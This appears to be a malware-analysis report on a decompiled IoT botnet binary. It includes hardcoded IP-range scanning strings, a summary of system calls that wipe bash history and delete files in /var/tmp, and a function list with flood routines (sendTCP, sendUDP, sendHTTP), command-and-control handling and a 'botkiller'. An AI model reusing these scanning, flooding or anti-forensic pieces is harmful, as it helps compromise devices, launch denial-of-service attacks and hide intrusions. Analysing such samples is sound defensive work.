        szprintf(v164, (int32_t)"113.164.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"113.165.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"113.166.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"113.167.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"113.168.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"113.169.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"123.17.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"123.18.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"123.19.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"123.20.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"123.21.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"123.22.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"222.252.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"222.253.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"222.254.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"222.255.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"37.247.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"41.208.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"183.220.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"175.201.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"103.198.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"183.223.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"50.205.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"88.248.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"88.105.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"88.247.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"85.105.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"188.3.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"103.203.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"103.55.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"103.220.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"183.233.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"103.242.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"103.198.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"103.14.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"103.195.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"103.203.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"103.214.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"103.218.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"103.225.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"103.228.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"103.231.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"103.60.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"103.248.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"103.253.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"103.255.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"103.35.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"103.49.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"103.62.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"144.48.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"163.47.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"163.53.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"223.29.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"59.153.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"113.176.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"113.175.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"113.177.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"113.183.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"202.164.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"203.134.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"210.56.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"49.156.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"203.210.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"117.181.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"117.178.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"117.177.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"117.176.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"117.170.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"117.171.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"117.162.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"112.26.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"112.27.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"112.28.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"112.29.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"112.30.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"112.31.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"203.150.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

    inet_addr((int32_t)"8.8.8.8");

================================================================================
========	SYSTEM CALLS SUMMARY : ================================================
================================================================================
            __libc_system(v165);

            __libc_system(v165);

    __libc_system((int32_t)"history -c;history -w");

    __libc_system((int32_t)"cd /root;rm -rf .bash_history");

    return __libc_system((int32_t)"cd /var/tmp; rm -f *");

int32_t __libc_system(int32_t a1) {

================================================================================
========	FUNCTIONS LIST : =======================================================
================================================================================
FUNCTION_NAME                                     |ARGS|LENGH   |SUSPCET_INSTRC|WHILE_INSTRC|
----------------------------------------------------------------------------------------------
processCmd                                        |2   |3283    |373           |645         |
----------------------------------------------------------------------------------------------
GetRandomPublicIP                                 |5   |1418    |214           |0           |
----------------------------------------------------------------------------------------------
main                                              |0   |780     |85            |496         |
----------------------------------------------------------------------------------------------
__dns_lookup                                      |6   |1111    |48            |813         |
----------------------------------------------------------------------------------------------
fdpopen                                           |2   |468     |38            |0           |
----------------------------------------------------------------------------------------------
_memcpy                                           |2   |2439    |35            |1045        |
----------------------------------------------------------------------------------------------
sendTCP                                           |7   |434     |33            |132         |
----------------------------------------------------------------------------------------------
gethostbyname_r                                   |6   |538     |33            |0           |
----------------------------------------------------------------------------------------------
_fpmaxtostr                                       |5   |3712    |32            |3323        |
----------------------------------------------------------------------------------------------
prints                                            |5   |592     |30            |36          |
----------------------------------------------------------------------------------------------
StartTheLelz                                      |2   |739     |29            |530         |
----------------------------------------------------------------------------------------------
sendUDP                                           |8   |376     |27            |95          |
----------------------------------------------------------------------------------------------
__read_etc_hosts_r                                |0   |658     |26            |270         |
----------------------------------------------------------------------------------------------
_ppfs_parsespec                                   |1   |975     |19            |784         |
----------------------------------------------------------------------------------------------
_init                                             |0   |346     |19            |0           |
----------------------------------------------------------------------------------------------
getOurIP                                          |0   |309     |17            |107         |
----------------------------------------------------------------------------------------------
__open_nameservers                                |1   |433     |17            |226         |
----------------------------------------------------------------------------------------------
_stdio_fopen                                      |0   |1036    |13            |0           |
----------------------------------------------------------------------------------------------
print                                             |3   |454     |11            |266         |
----------------------------------------------------------------------------------------------
__uClibc_main                                     |7   |405     |9             |23          |
----------------------------------------------------------------------------------------------
__GI_inet_ntop                                    |4   |504     |9             |313         |
----------------------------------------------------------------------------------------------
getBogos                                          |3   |234     |9             |64          |
----------------------------------------------------------------------------------------------
sendHTTP                                          |6   |215     |8             |29          |
----------------------------------------------------------------------------------------------
printi                                            |7   |279     |8             |18          |
----------------------------------------------------------------------------------------------
getcwd                                            |2   |335     |7             |0           |
----------------------------------------------------------------------------------------------
realloc                                           |2   |340     |7             |0           |
----------------------------------------------------------------------------------------------
negotiate                                         |5   |240     |7             |0           |
----------------------------------------------------------------------------------------------
sendSTD                                           |4   |205     |7             |26          |
----------------------------------------------------------------------------------------------
__heap_free                                       |3   |247     |6             |68          |
----------------------------------------------------------------------------------------------
recvLine                                          |4   |287     |6             |85          |
----------------------------------------------------------------------------------------------
sendHTTP2                                         |6   |223     |6             |43          |
----------------------------------------------------------------------------------------------
memrchr                                           |4   |310     |6             |122         |
----------------------------------------------------------------------------------------------
__GI_memchr                                       |4   |330     |6             |132         |
----------------------------------------------------------------------------------------------
fdpclose                                          |1   |223     |6             |26          |
----------------------------------------------------------------------------------------------
getCores                                          |2   |191     |6             |19          |
----------------------------------------------------------------------------------------------
inet_pton                                         |3   |379     |5             |134         |
----------------------------------------------------------------------------------------------
fflush_unlocked                                   |1   |316     |4             |69          |
----------------------------------------------------------------------------------------------
__udivsi3                                         |2   |525     |4             |212         |
----------------------------------------------------------------------------------------------
sendCNC                                           |4   |182     |4             |0           |
----------------------------------------------------------------------------------------------
__modsi3                                          |2   |630     |4             |380         |
----------------------------------------------------------------------------------------------
socket_connect                                    |3   |200     |4             |0           |
----------------------------------------------------------------------------------------------
_vfprintf_internal                                |11  |926     |4             |730         |
----------------------------------------------------------------------------------------------
__aeabi_idiv                                      |2   |581     |4             |228         |
----------------------------------------------------------------------------------------------
readUntil                                         |8   |260     |4             |80          |
----------------------------------------------------------------------------------------------
strstr                                            |2   |315     |4             |131         |
----------------------------------------------------------------------------------------------
_stdlib_strto_l                                   |0   |668     |4             |131         |
----------------------------------------------------------------------------------------------
__umodsi3                                         |2   |565     |4             |354         |
----------------------------------------------------------------------------------------------
sleep                                             |1   |265     |4             |0           |
----------------------------------------------------------------------------------------------
__GI_wcsnrtombs                                   |5   |356     |3             |65          |
----------------------------------------------------------------------------------------------
botkiller                                         |1   |187     |3             |18          |
----------------------------------------------------------------------------------------------
ClearHistory                                      |0   |169     |3             |0           |
----------------------------------------------------------------------------------------------
initConnection                                    |0   |200     |3             |0           |
----------------------------------------------------------------------------------------------
_ppfs_setargs                                     |0   |343     |3             |116         |
----------------------------------------------------------------------------------------------
listFork                                          |0   |197     |3             |20          |
----------------------------------------------------------------------------------------------
connectTimeout                                    |4   |220     |3             |0           |
----------------------------------------------------------------------------------------------
trim                                              |1   |227     |3             |39          |
----------------------------------------------------------------------------------------------
strncpy                                           |3   |273     |3             |81          |
----------------------------------------------------------------------------------------------
strnlen                                           |1   |356     |3             |107         |
----------------------------------------------------------------------------------------------
sockprintf                                        |2   |175     |3             |0           |
----------------------------------------------------------------------------------------------
__open_etc_hosts                                  |0   |173     |2             |0           |
----------------------------------------------------------------------------------------------
strcasestr                                        |3   |222     |2             |50          |
----------------------------------------------------------------------------------------------
contains_string                                   |2   |193     |2             |15          |
----------------------------------------------------------------------------------------------
matchPrompt                                       |1   |236     |2             |62          |
----------------------------------------------------------------------------------------------
srandom_r                                         |2   |218     |2             |10          |
----------------------------------------------------------------------------------------------
__GI_strspn                                       |1   |211     |2             |35          |
----------------------------------------------------------------------------------------------
__GI_strchr                                       |2   |258     |2             |88          |
----------------------------------------------------------------------------------------------
__GI_fgets_unlocked                               |3   |286     |2             |74          |
----------------------------------------------------------------------------------------------
__GI_sigprocmask                                  |4   |208     |2             |0           |
----------------------------------------------------------------------------------------------
__stdio_WRITE                                     |3   |253     |2             |77          |
----------------------------------------------------------------------------------------------
__GI_strpbrk                                      |0   |209     |2             |33          |
----------------------------------------------------------------------------------------------
__raise                                           |1   |168     |2             |0           |
----------------------------------------------------------------------------------------------
__vfork                                           |0   |180     |2             |0           |
----------------------------------------------------------------------------------------------
__libc_system                                     |1   |211     |2             |0           |
----------------------------------------------------------------------------------------------
__xpg_strerror_r                                  |0   |299     |2             |70          |
----------------------------------------------------------------------------------------------
_uintmaxtostr                                     |5   |288     |2             |56          |
----------------------------------------------------------------------------------------------
__aeabi_ddiv                                      |4   |677     |2             |201         |
----------------------------------------------------------------------------------------------
inet_aton                                         |2   |262     |2             |87          |
----------------------------------------------------------------------------------------------
__decode_dotted                                   |0   |271     |2             |83          |
----------------------------------------------------------------------------------------------
__GI_initstate_r                                  |4   |235     |2             |0           |
----------------------------------------------------------------------------------------------
__GI_fclose                                       |1   |212     |2             |0           |
----------------------------------------------------------------------------------------------
__GI_memset                                       |2   |293     |2             |74          |
----------------------------------------------------------------------------------------------
wait4                                             |0   |177     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_fork                                       |0   |177     |1             |0           |
----------------------------------------------------------------------------------------------
csum                                              |2   |274     |1             |18          |
----------------------------------------------------------------------------------------------
inet_addr                                         |1   |175     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_open                                       |2   |182     |1             |0           |
----------------------------------------------------------------------------------------------
zprintf                                           |1   |167     |1             |0           |
----------------------------------------------------------------------------------------------
random                                            |0   |172     |1             |0           |
----------------------------------------------------------------------------------------------
getsockopt                                        |0   |177     |1             |0           |
----------------------------------------------------------------------------------------------
__check_one_fd                                    |2   |184     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_creat                                      |1   |177     |1             |0           |
----------------------------------------------------------------------------------------------
GetRandomIP                                       |1   |168     |1             |0           |
----------------------------------------------------------------------------------------------
sclose                                            |1   |174     |1             |0           |
----------------------------------------------------------------------------------------------
srand                                             |1   |170     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_connect                                    |4   |177     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_gethostbyname                                |1   |170     |1             |0           |
----------------------------------------------------------------------------------------------
malloc                                            |1   |260     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_inet_ntoa_r                                  |0   |191     |1             |17          |
----------------------------------------------------------------------------------------------
__libc_send                                       |4   |177     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_waitpid                                    |3   |167     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_vsnprintf                                    |0   |191     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_close                                      |1   |177     |1             |0           |
----------------------------------------------------------------------------------------------
_ppfs_init                                        |1   |227     |1             |36          |
----------------------------------------------------------------------------------------------
fdgets                                            |4   |192     |1             |21          |
----------------------------------------------------------------------------------------------
getBuild                                          |0   |167     |1             |0           |
----------------------------------------------------------------------------------------------
advance_state                                     |2   |174     |1             |0           |
----------------------------------------------------------------------------------------------
socket                                            |0   |177     |1             |0           |
----------------------------------------------------------------------------------------------
inet_ntop4                                        |3   |218     |1             |45          |
----------------------------------------------------------------------------------------------
free                                              |0   |231     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_getsockname                                  |6   |177     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_fopen                                        |2   |167     |1             |0           |
----------------------------------------------------------------------------------------------
rawmemchr                                         |2   |214     |1             |10          |
----------------------------------------------------------------------------------------------
abort                                             |0   |235     |1             |4           |
----------------------------------------------------------------------------------------------
getdtablesize                                     |0   |174     |1             |0           |
----------------------------------------------------------------------------------------------
kill                                              |0   |177     |1             |0           |
----------------------------------------------------------------------------------------------
__heap_alloc                                      |2   |227     |1             |41          |
----------------------------------------------------------------------------------------------
__GI_strcasecmp                                   |2   |212     |1             |40          |
----------------------------------------------------------------------------------------------
get_telstate_host                                 |3   |168     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_getpid                                     |0   |177     |1             |0           |
----------------------------------------------------------------------------------------------
getHost                                           |2   |168     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_setsockopt                                   |5   |177     |1             |0           |
----------------------------------------------------------------------------------------------
rand                                              |0   |167     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_inet_ntoa                                    |1   |175     |1             |0           |
----------------------------------------------------------------------------------------------
makeIPPacket                                      |4   |169     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_sendto                                     |6   |177     |1             |0           |
----------------------------------------------------------------------------------------------
inet_pton4                                        |2   |246     |1             |53          |
----------------------------------------------------------------------------------------------
_promoted_size                                    |0   |190     |1             |19          |
----------------------------------------------------------------------------------------------
fgets                                             |3   |181     |1             |0           |
----------------------------------------------------------------------------------------------
_charpad                                          |3   |193     |1             |17          |
----------------------------------------------------------------------------------------------
__heap_alloc_at                                   |3   |226     |1             |51          |
----------------------------------------------------------------------------------------------
_stdio_term                                       |0   |209     |1             |13          |
----------------------------------------------------------------------------------------------
__GI_strcoll                                      |2   |191     |1             |19          |
----------------------------------------------------------------------------------------------
parseHex                                          |2   |192     |1             |17          |
----------------------------------------------------------------------------------------------
__encode_dotted                                   |1   |260     |1             |60          |
----------------------------------------------------------------------------------------------
makeRandomStr                                     |2   |178     |1             |0           |
----------------------------------------------------------------------------------------------
isatty                                            |1   |176     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_strncat                                      |4   |252     |1             |24          |
----------------------------------------------------------------------------------------------
tcpcsum                                           |4   |173     |1             |0           |
----------------------------------------------------------------------------------------------
__get_hosts_byname_r                              |7   |167     |1             |0           |
----------------------------------------------------------------------------------------------
szprintf                                          |5   |166     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_recv                                       |5   |177     |1             |0           |
----------------------------------------------------------------------------------------------
__length_dotted                                   |0   |196     |1             |16          |
----------------------------------------------------------------------------------------------
sprintf                                           |6   |167     |1             |0           |
----------------------------------------------------------------------------------------------
read_with_timeout                                 |4   |189     |1             |0           |
----------------------------------------------------------------------------------------------
_stdio_openlist_dec_use                           |1   |236     |1             |33          |
----------------------------------------------------------------------------------------------
function_1b08c                                    |1   |647     |0             |0           |
----------------------------------------------------------------------------------------------
__cmpdf2                                          |0   |168     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_time                                         |1   |177     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_sigaddset                                    |2   |180     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_init_mutex                                |0   |173     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___uClibc_init                                |1   |174     |0             |0           |
----------------------------------------------------------------------------------------------
isspace                                           |1   |168     |0             |0           |
----------------------------------------------------------------------------------------------
__heap_link_free_area                             |0   |180     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_select                                     |5   |177     |0             |0           |
----------------------------------------------------------------------------------------------
__decode_answer                                   |4   |188     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_fwrite                                    |3   |253     |0             |0           |
----------------------------------------------------------------------------------------------
contains_response                                 |1   |173     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fputs                                        |2   |181     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_drsub                                     |2   |167     |0             |0           |
----------------------------------------------------------------------------------------------
__fixunsdfsi                                      |2   |192     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fcntl64                                      |0   |178     |0             |0           |
----------------------------------------------------------------------------------------------
rand_cmwc                                         |0   |185     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_pipe                                         |1   |180     |0             |0           |
----------------------------------------------------------------------------------------------
call___do_global_dtors_aux                        |0   |168     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_random_r                                     |2   |198     |0             |0           |
----------------------------------------------------------------------------------------------
__default_sa_restorer                             |2   |167     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_dcmpeq                                    |0   |171     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_adjust_position                           |2   |387     |0             |0           |
----------------------------------------------------------------------------------------------
getuid                                            |0   |178     |0             |0           |
----------------------------------------------------------------------------------------------
getgid                                            |1   |177     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___uClibc_fini                                |1   |180     |0             |0           |
----------------------------------------------------------------------------------------------
function_1b4d8                                    |1   |210     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_dcmple                                    |0   |172     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_dmul                                      |4   |625     |0             |0           |
----------------------------------------------------------------------------------------------
ntohl                                             |1   |167     |0             |0           |
----------------------------------------------------------------------------------------------
strtol                                            |0   |167     |0             |0           |
----------------------------------------------------------------------------------------------
frame_dummy                                       |0   |171     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_ul2d                                      |2   |172     |0             |0           |
----------------------------------------------------------------------------------------------
__syscall_rt_sigaction                            |1   |180     |0             |0           |
----------------------------------------------------------------------------------------------
_24_d_2                                           |3   |183     |0             |0           |
----------------------------------------------------------------------------------------------
dup2                                              |0   |177     |0             |0           |
----------------------------------------------------------------------------------------------
chdir                                             |0   |177     |0             |0           |
----------------------------------------------------------------------------------------------
__sigaddset                                       |0   |172     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_execve                                       |0   |185     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_write                                      |2   |179     |0             |0           |
----------------------------------------------------------------------------------------------
__errno_location                                  |0   |167     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_dcmplt                                    |0   |171     |0             |0           |
----------------------------------------------------------------------------------------------
__encode_question                                 |7   |177     |0             |0           |
----------------------------------------------------------------------------------------------
function_1afdc                                    |0   |195     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_ldiv0                                     |0   |168     |0             |0           |
----------------------------------------------------------------------------------------------
call___do_global_ctors_aux                        |0   |168     |0             |0           |
----------------------------------------------------------------------------------------------
__pthread_return_void                             |0   |168     |0             |0           |
----------------------------------------------------------------------------------------------
usleep                                            |1   |167     |0             |0           |
----------------------------------------------------------------------------------------------
reset_telstate                                    |3   |167     |0             |0           |
----------------------------------------------------------------------------------------------
printchar                                         |2   |179     |0             |0           |
----------------------------------------------------------------------------------------------
__GI__exit                                        |1   |168     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_trans2r_o                                 |0   |226     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_cdcmple                                   |0   |174     |0             |0           |
----------------------------------------------------------------------------------------------
__do_global_dtors_aux                             |0   |188     |0             |0           |
----------------------------------------------------------------------------------------------
strcat                                            |2   |188     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_wcommit                                   |0   |180     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_dsub                                      |2   |168     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_wcsrtombs                                    |0   |171     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_strdup                                       |1   |169     |0             |0           |
----------------------------------------------------------------------------------------------
_dl_aux_init                                      |1   |169     |0             |0           |
----------------------------------------------------------------------------------------------
wildString                                        |2   |231     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_poll                                       |8   |177     |0             |0           |
----------------------------------------------------------------------------------------------
__sigdelset                                       |2   |169     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_lseek64                                    |6   |185     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_uidivmod                                  |2   |167     |0             |0           |
----------------------------------------------------------------------------------------------
_start                                            |2   |168     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_tolower                                      |1   |174     |0             |0           |
----------------------------------------------------------------------------------------------
_load_inttype                                     |0   |210     |0             |0           |
----------------------------------------------------------------------------------------------
htonl                                             |1   |167     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_rfill                                     |1   |169     |0             |0           |
----------------------------------------------------------------------------------------------
__floatsidf                                       |1   |177     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___glibc_strerror_r                           |3   |168     |0             |0           |
----------------------------------------------------------------------------------------------
__ltdf2                                           |0   |167     |0             |0           |
----------------------------------------------------------------------------------------------
_24_d_3                                           |4   |175     |0             |0           |
----------------------------------------------------------------------------------------------
_24_d                                             |3   |174     |0             |0           |
----------------------------------------------------------------------------------------------
prctl                                             |0   |177     |0             |0           |
----------------------------------------------------------------------------------------------
__muldi3                                          |4   |177     |0             |0           |
----------------------------------------------------------------------------------------------
strcpy                                            |2   |180     |0             |0           |
----------------------------------------------------------------------------------------------
memmove                                           |4   |169     |0             |0           |
----------------------------------------------------------------------------------------------
__heap_link_free_area_after                       |0   |174     |0             |0           |
----------------------------------------------------------------------------------------------
getegid                                           |0   |178     |0             |0           |
----------------------------------------------------------------------------------------------
function_1b2e8                                    |0   |187     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_ui2d                                      |1   |172     |0             |0           |
----------------------------------------------------------------------------------------------
__syscall_error                                   |0   |168     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_nanosleep                                  |3   |177     |0             |0           |
----------------------------------------------------------------------------------------------
function_1b030                                    |4   |208     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_READ                                      |3   |206     |0             |0           |
----------------------------------------------------------------------------------------------
_fini                                             |0   |169     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_seek                                      |3   |181     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_setsid                                       |0   |177     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_sigaction                                  |3   |204     |0             |0           |
----------------------------------------------------------------------------------------------
geteuid                                           |0   |178     |0             |0           |
----------------------------------------------------------------------------------------------
htons                                             |1   |167     |0             |0           |
----------------------------------------------------------------------------------------------
function_12ce8                                    |1   |167     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_dcmpgt                                    |0   |171     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_strtok                                       |2   |173     |0             |0           |
----------------------------------------------------------------------------------------------
__pthread_return_0                                |0   |167     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_toupper                                      |1   |174     |0             |0           |
----------------------------------------------------------------------------------------------
function_189b8                                    |1   |167     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_read                                       |1   |180     |0             |0           |
----------------------------------------------------------------------------------------------
atol                                              |1   |167     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_dcmpge                                    |0   |172     |0             |0           |
----------------------------------------------------------------------------------------------
sigemptyset                                       |1   |169     |0             |0           |
----------------------------------------------------------------------------------------------
setstate                                          |2   |171     |0             |0           |
----------------------------------------------------------------------------------------------
contains_success                                  |1   |167     |0             |0           |
----------------------------------------------------------------------------------------------
__adddf3                                          |4   |377     |0             |0           |
----------------------------------------------------------------------------------------------
read_until_response                               |4   |176     |0             |0           |
----------------------------------------------------------------------------------------------
__do_global_ctors_aux                             |1   |183     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_brk                                          |1   |175     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_trans2w_o                                 |2   |315     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fwrite_unlocked                              |4   |233     |0             |0           |
----------------------------------------------------------------------------------------------
getrlimit                                         |2   |177     |0             |0           |
----------------------------------------------------------------------------------------------
function_1b878                                    |0   |446     |0             |0           |
----------------------------------------------------------------------------------------------
contains_fail                                     |1   |167     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fseeko64                                     |0   |246     |0             |0           |
----------------------------------------------------------------------------------------------
